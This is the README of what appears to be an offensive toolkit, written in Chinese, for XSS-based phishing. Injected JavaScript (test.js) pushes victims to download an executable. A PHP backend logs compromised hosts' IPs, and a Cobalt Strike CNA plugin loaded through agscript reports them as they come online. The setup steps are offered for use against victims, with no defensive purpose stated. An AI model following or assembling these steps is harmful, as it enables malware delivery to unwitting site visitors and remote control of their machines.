# XSS-Phishing
xss钓鱼，cna插件配合php后端收杆

希望这个解决方案够用

## Usage:

搭建bobo.php, 路径为http://www.xxx.com/bobo.php

在php根目录新建botIPs.txt文件用于存储已上线ip

test.js可远程加载也可本地加载，修改xss内容即可

修改test.js里的下载地址为exe的地址

使用cobalt strike 的agscript加载cna插件
./agscript [ip] [port] [username] [password] sendip.cna

等待上线即可
